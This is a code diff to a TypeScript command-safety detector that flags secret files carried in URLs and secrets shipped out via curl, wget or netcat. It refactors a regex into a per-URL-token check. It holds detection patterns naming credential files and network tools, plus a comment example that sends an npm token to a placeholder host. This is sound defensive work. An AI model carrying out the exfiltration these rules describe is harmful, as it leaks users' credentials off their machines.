@@ -14,6 +14,8 @@
  * that defeat regex, and it generalizes to variants it has never seen.
  */
 
+import { urlTokenCarries } from "./url-scan.js";
+
 export type Cap = { id: string; decision: "deny" | "ask"; label: string };
 
 // ── Symbolic resolution ────────────────────────────────────────────────────────
@@ -243,9 +245,12 @@ function detectReverseShell(s: string): Cap | null {
 /** A secret FILE path embedded directly inside an http(s) URL — fetching that URL
  *  (a markdown image, a badge, a beacon) ships the file path/contents off-box.
  *  The token is contiguous with the URL (no space/quote), so benign prose that
- *  merely links somewhere and mentions `.ssh` elsewhere does not match. */
+ *  merely links somewhere and mentions `.ssh` elsewhere does not match. Checked
+ *  per URL token (url-scan): as one regex it re-scanned every run of repeated
+ *  `http://` and was quadratic. */
+const URL_TOKEN = /https?:\/\/[^\s)'"]*/gi;
 const SECRET_PATH_IN_URL =
-  /https?:\/\/[^\s)'"]*(?:id_rsa|id_ed25519|id_ecdsa|id_dsa|\/\.ssh(?:\/|\b)|~\/\.ssh|\.aws\/credentials|\.aws(?:\/|%2F)|\.npmrc\b|\.netrc\b|\.pgpass\b|\.git-credentials|\.kube\/config|credentials\.json|\/etc\/shadow)/i;
+  /(?:id_rsa|id_ed25519|id_ecdsa|id_dsa|\/\.ssh(?:\/|\b)|~\/\.ssh|\.aws\/credentials|\.aws(?:\/|%2F)|\.npmrc\b|\.netrc\b|\.pgpass\b|\.git-credentials|\.kube\/config|credentials\.json|\/etc\/shadow)/i;
 /** A known secret env value concatenated onto a fetched URL string literal
  *  (`fetch('https://x/r?id='+process.env.NPM_TOKEN)`) — the request carries the
  *  secret in its URL. Anchored on `"<http url>" +` so a header-based auth client
@@ -262,7 +267,7 @@ function detectSecretExfil(s: string): Cap | null {
       return { id: "exfil-secret-public", decision: "deny", label: "copies a secret file into a publicly-served location" };
   }
   // A secret file path carried inside a fetched URL (markdown image / beacon).
-  if (SECRET_PATH_IN_URL.test(s))
+  if (urlTokenCarries(s, URL_TOKEN, SECRET_PATH_IN_URL))
     return { id: "exfil-secret-net", decision: "deny", label: "reads a secret file and sends it off the machine" };
   // Bare secret env-var NAME (ENVIRON["AWS_SECRET…"], $GITHUB_TOKEN) shipped as POST data.
   if (SECRET_ENVNAME.test(s) && /\b(?:curl|wget)\b[^\n]*(?:-d\b|--data\S*|-F\b|--form|-T\b|--upload|-G\b)|\|\s*(?:curl|wget|n(?:c|cat)|logger)\b/i.test(s))
